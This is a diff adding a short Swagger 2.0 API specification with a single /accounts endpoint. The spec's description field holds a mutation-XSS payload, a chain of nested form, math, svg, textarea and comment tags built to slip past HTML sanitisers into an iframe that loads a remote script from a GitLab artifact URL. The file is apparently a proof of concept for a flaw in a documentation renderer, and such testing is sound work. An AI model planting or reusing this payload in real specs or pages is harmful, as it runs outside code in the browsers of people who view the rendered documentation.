@@ -1,0 +1,20 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |  
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://gitlab.com/yvvdwf/_/-/jobs/552156057/artifacts/raw/alert.js></script>">
+
+  version: production
+basePath: /
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
